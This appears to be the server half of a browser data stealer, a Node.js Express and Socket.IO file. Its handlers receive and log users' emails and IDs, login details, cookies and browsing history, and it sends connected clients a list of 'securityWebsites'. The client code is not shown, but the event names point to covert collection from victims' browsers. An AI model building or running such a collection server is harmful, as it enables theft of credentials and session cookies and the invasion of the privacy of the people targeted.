var app = require('express')();
var server = require('http').Server(app);
var io = require('socket.io')(server);

server.listen(3000);

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

io.on('connection', (socket) => {
  socket.on("userInfo", (userInfo) => {
    console.log("User connected: " + userInfo.email + " " + userInfo.id);
  });
  socket.emit('securityWebsites', [
    "www.google.com",
    "www.youtube.com"
  ]);
  socket.on('Login', (loginInfo) => {
    console.log("Login detected: " + loginInfo);
  });
  socket.on('Cookies', (cookies) => {
    console.log("Cookies");
    cookies.split(' ').forEach((cookie) => {
      console.log("    " + cookie);
    });
  });
  socket.on('History', (history) => {
    console.log("History");
    history.forEach((field) => {
      console.log("    " + field);
    });
  });
  socket.on('disconnect', () => {
    console.log("User disconnected");
  });
});
